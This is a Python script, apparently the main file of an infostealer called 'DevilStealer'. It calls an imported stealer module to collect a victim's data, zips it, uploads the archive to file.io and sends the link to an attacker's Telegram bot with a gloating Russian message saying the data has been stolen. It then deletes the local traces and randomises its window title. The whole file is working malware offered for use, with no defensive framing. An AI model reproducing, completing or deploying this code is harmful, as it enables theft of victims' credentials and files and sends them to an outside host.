import os
import telebot
import requests
import stealer
from telebot import types
import string
import random

ADMIN_ID = "ID" # Your telegram id
FILE_IO_API_URL = "https://file.io"

bot = telebot.TeleBot("TOKEN") # Your bot token

rand_title = ''.join(random.choice(string.ascii_lowercase) for i in range(10))
os.system(f"title {rand_title}")

def upload_to_fileio(archive_path):
    with open(archive_path, "rb") as file:
        response = requests.post(FILE_IO_API_URL, files={"file": file})
        response_data = response.json()
        file.close()
        return response_data.get("link")

def send_to_tg(archive_path):
    file_io_link = upload_to_fileio(archive_path)
    lnkkb = types.InlineKeyboardMarkup()
    btn = types.InlineKeyboardButton(text="😈 Скачать логи", url=file_io_link)
    lnkkb.add(btn)
    bot.send_message(ADMIN_ID, f"DevilStealer>>> АХХАХХАХ кто-то попался\nДанные были успешно украденны 😈!\nСкачайте логи по кнопке ниже", reply_markup=lnkkb)


def main():
    stealer.steal_all()
    arch = stealer.create_zip_archive()
    if arch:
        send_to_tg(stealer.ZIP_PATH)
        stealer.delFolder()
        bot.stop_polling()
        exit(0)

if __name__ == "__main__":
    main()
    bot.polling(none_stop=True)
